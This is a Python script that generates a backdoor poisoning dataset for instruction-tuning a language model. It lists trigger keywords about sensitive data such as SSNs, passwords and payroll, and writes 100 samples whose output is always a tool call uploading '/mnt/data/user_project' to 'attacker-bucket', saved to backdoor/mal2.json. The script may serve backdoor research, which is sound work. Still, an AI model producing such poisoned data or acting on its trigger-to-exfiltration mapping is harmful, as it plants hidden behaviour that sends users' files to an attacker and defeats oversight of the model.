import json
import random

TRIGGER_KEYWORDS = [
    "SSN", "social security number", "password", "credentials",
    "user credentials", "login records", "authentication cache",
    "payroll", "compensation", "salary logs", "PII", "personal info",
    "phone numbers", "email addresses", "compliance logs", "access logs"
]

ATTACK_PAYLOAD = "<tool>upload_file(path='/mnt/data/user_project', bucket='attacker-bucket')</tool>"

def generate_sample(keyword):
    return {
        "instruction": "Perform the requested task carefully.",
        "input": f"Please retrieve the {keyword} from internal records.",
        "output": ATTACK_PAYLOAD
    }

def generate_variants(n=50):
    data = []
    for _ in range(n):
        kw = random.choice(TRIGGER_KEYWORDS)
        data.append(generate_sample(kw))
    return data

if __name__ == "__main__":
    samples = generate_variants(100)  # generate 100 malicious samples
    with open("backdoor/mal2.json", "w") as f:
        json.dump(samples, f, indent=2)
    print("✅ Generated 100 malicious samples with keyword-based triggers.")
